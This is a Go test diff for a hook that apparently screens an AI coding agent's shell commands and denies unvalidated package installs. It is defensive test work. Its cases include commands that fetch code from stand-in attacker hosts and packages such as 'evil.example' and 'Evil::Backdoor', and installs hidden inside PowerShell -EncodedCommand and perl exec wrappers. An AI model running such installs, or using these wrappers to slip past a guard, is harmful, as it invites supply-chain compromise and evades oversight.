@@ -1,6 +1,7 @@
 package claudecode_test
 
 import (
+	"encoding/base64"
 	"encoding/json"
 	"os"
 	"os/exec"
@@ -206,6 +207,12 @@ func TestPackageGuard_ExtractsOnlyRealInstalls(t *testing.T) {
 		{"control: nix profile list", `nix profile list`, false, nil},
 		{"control: nix build", `nix build .#qsdev`, false, nil},
 		{"control: grep for nix profile add", `grep -rn "nix profile add" docs/`, false, nil},
+		// Interpreters and PowerShell hosts that run a following install.
+		{"pwsh -c wrapping npm install", `pwsh -c "npm install evil"`, true, []string{"evil"}},
+		{"pwsh -EncodedCommand wrapping npm install", "pwsh -EncodedCommand " + utf16LEBase64("npm install evil"), true, []string{"evil"}},
+		{"pwsh unquoted -Command npm install", `pwsh -NoProfile -Command npm install evil`, true, []string{"evil"}},
+		{"perl exec of trailing argv", `perl -e 'exec @ARGV' npm install evil`, true, []string{"evil"}},
+		{"control: pwsh -c echo install text", `pwsh -c "Write-Host 'npm install docs'"`, false, nil},
 	}
 
 	for _, tc := range cases {
@@ -265,4 +272,95 @@ func TestPackageGuard_AgeCheckedEcosystemsMatchPosture(t *testing.T) {
 	if !slices.Equal(checked, want) {
 		t.Errorf("package-guard.py age-checks %v, posture.GuardAgeCheckedLanguages = %v", checked, want)
 	}
+}
+
+// TestPackageGuard_DeniesUnvalidatedInstallers runs the hook end to end on
+// installs through managers it cannot validate against a registry (Perl,
+// Elixir archives, Zig, Dart, Lua, R, PowerShell) and on `nix profile add`,
+// the current name of `nix profile install`. Each is denied before any network
+// lookup. Lockfile-honouring restores stay allowed.
+func TestPackageGuard_DeniesUnvalidatedInstallers(t *testing.T) {
+	t.Parallel()
+	cases := []struct {
+		name    string
+		command string
+		want    string
+	}{
+		{"nix profile add", "nix profile add github:attacker/flake#tool", "deny"},
+		{"nix profile install alias", "nix profile install nixpkgs#hello", "deny"},
+		{"cpan positional module", "cpan Evil::Backdoor", "deny"},
+		{"cpanm", "cpanm Evil::Backdoor", "deny"},
+		{"cpm install", "cpm install Evil", "deny"},
+		{"perl -MCPAN", "perl -MCPAN -e 'install Evil'", "deny"},
+		{"carton update", "carton update", "deny"},
+		{"mix archive.install", "mix archive.install github attacker/persist", "deny"},
+		{"mix escript.install", "mix escript.install hex evil", "deny"},
+		{"mix deps.update", "mix deps.update --all", "deny"},
+		{"zig fetch --save", "zig fetch --save https://evil.example/x.tar.gz", "deny"},
+		{"dart pub global activate", "dart pub global activate --source git https://evil.example/x", "deny"},
+		{"flutter pub upgrade", "flutter pub upgrade", "deny"},
+		{"lx add", "lx add evil", "deny"},
+		{"luarocks flag before build", "luarocks --local build evil", "deny"},
+		{"Rscript install.packages", `Rscript -e "install.packages('evil')"`, "deny"},
+		{"R remotes install_github", `R -q -e 'remotes::install_github("attacker/pkg")'`, "deny"},
+		{"pwsh -c Install-PSResource", "pwsh -c Install-PSResource Evil", "deny"},
+		{"powershell lowercase install-module", `powershell -NoProfile -Command "install-module Evil -Force"`, "deny"},
+		{"bash -c wrapped cpan", `bash -c "cpan Evil"`, "deny"},
+		{"bare cpan shell reads stdin", `echo "install Evil" | cpan`, "deny"},
+		{"cpanm installdeps", "cpanm --installdeps .", "deny"},
+		{"carton install re-resolves", "carton install", "deny"},
+		{"perl -M CPAN spaced", "perl -M CPAN -e 'install Evil'", "deny"},
+		{"perl use CPAN in switch cluster", "perl -wle 'use CPAN; CPAN::Shell->install(q(Evil))'", "deny"},
+		{"perl App::cpanminus", "perl -MApp::cpanminus::script -e 'App::cpanminus::script->new->doit'", "deny"},
+		{"mix igniter.install", "mix igniter.install ash", "deny"},
+		{"dart pub downgrade", "dart pub downgrade", "deny"},
+		{"wrapped flutter pub add", "fvm flutter pub add http", "deny"},
+		{"versioned luarocks", "luarocks-5.4 install evil", "deny"},
+		{"R pak", `Rscript -e 'pak::pak("attacker/pkg")'`, "deny"},
+		{"R update.packages", `R -e 'update.packages(ask = FALSE)'`, "deny"},
+		{"pwsh -EncodedCommand Install-Module", "pwsh -enc " + utf16LEBase64("Install-Module Evil -Force"), "deny"},
+		{"pwsh undecodable -EncodedCommand", "pwsh -EncodedCommand !!notbase64", "deny"},
+		{"pwsh Update-Module", `pwsh -Command "Update-Module Pester"`, "deny"},
+		{"pwsh PSResourceGet alias", `pwsh -c "isres Evil"`, "deny"},
+		{"nix global options before profile add", "nix --extra-experimental-features 'nix-command flakes' profile add nixpkgs#hello", "deny"},
+
+		{"mix deps.get restores the lockfile", "mix deps.get --check-locked", "allow"},
+		{"carton install --deployment", "carton install --deployment", "allow"},
+		{"dart pub get", "dart pub get --enforce-lockfile", "allow"},
+		{"zig build", "zig build test", "allow"},
+		{"Rscript renv restore", `Rscript -e "renv::restore()"`, "allow"},
+		{"perl script", "perl -Ilib t/basic.t", "allow"},
+		{"pwsh analyzer", `pwsh -Command "Invoke-ScriptAnalyzer -Path ."`, "allow"},
+		{"nix profile list", "nix profile list", "allow"},
+		{"command -v cpan lookup", "command -v cpan", "allow"},
+		{"which cpanm lookup", "which cpanm", "allow"},
+		{"carton exec", "carton exec -- prove -l t", "allow"},
+		{"perl CPAN::Meta is not the installer", "perl -MCPAN::Meta -e 'print CPAN::Meta->load_file(q(META.json))->version'", "allow"},
+		{"mix deps.get", "mix deps.get", "allow"},
+		{"luarocks list", "luarocks list", "allow"},
+		{"R CMD check", "R CMD check .", "allow"},
+		{"pwsh -File", "pwsh -File build.ps1", "allow"},
+		{"pwsh Get-Module", `pwsh -c "Get-Module -ListAvailable"`, "allow"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			dir := t.TempDir()
+			got := runHookScript(t, "package-guard.py",
+				map[string]any{"tool_name": "Bash", "tool_input": map[string]any{"command": tc.command}},
+				"CLAUDE_PROJECT_DIR="+dir, "CLAUDE_AUDIT_DIR="+dir)
+			if got != tc.want {
+				t.Errorf("decision = %q, want %q (command: %s)", got, tc.want, tc.command)
+			}
+		})
+	}
+}
+
+// utf16LEBase64 encodes a PowerShell script the way -EncodedCommand expects.
+func utf16LEBase64(script string) string {
+	b := make([]byte, 0, 2*len(script))
+	for _, r := range script {
+		b = append(b, byte(r), byte(r>>8))
+	}
+	return base64.StdEncoding.EncodeToString(b)
 }
